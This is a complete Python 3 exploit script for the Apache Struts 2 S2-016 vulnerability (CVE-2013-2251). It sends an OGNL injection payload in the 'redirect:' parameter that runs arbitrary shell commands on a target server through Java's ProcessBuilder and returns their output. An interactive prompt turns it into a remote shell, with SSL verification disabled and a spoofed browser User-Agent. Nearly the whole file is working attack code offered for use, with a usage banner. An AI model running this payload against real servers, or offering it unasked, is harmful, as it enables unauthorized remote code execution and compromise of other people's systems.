#!/usr/bin/python3
#
# coding=utf-8
#
# Struts 2 DefaultActionMapper Exploit [S2-016]
# Interactive Shell for CVE-2013-2251
#
# Exploit Author: Jonatas Fil (@exploitation)
# Fixed and Updated to Python 3
#

import requests
import sys
import readline

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def exploit(target):
    first = target + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
    second = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"

    while True:
        cmd = input("$ ").strip()
        if cmd == '':
            continue
        if cmd == '\q':
            print("Exiting...")
            sys.exit()

        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
            }
            response = requests.get(first + cmd + second, headers=headers, verify=False)

            if response.status_code == 200:
                print(response.text)  # Print command output
            else:
                print("Not Vulnerable!")
                sys.exit()
        except Exception as e:
            print(f"Error: {e}")
            print("Exiting...")
            sys.exit()

if len(sys.argv) != 2:
    print('''
 __ _          _ _   __       _ _
/ _\ |__   ___| | | /__\_   _(_) |
\ \| '_ \ / _ \ | |/_\ \ \ / / | |
_\ \ | | |  __/ | //__  \ V /| | |
\__/_| |_|\___|_|_\__/   \_/ |_|_|

          by Jonatas Fil [@exploitation]
''')
    print("======================================================")
    print("#    Struts 2 DefaultActionMapper Exploit [S2-016]   #")
    print("# Usage: python3 struts.py http://site.com:8080/xxx.action #")
    print("======================================================")
    print("bye")
    sys.exit()

target_url = sys.argv[1]
exploit(target_url)
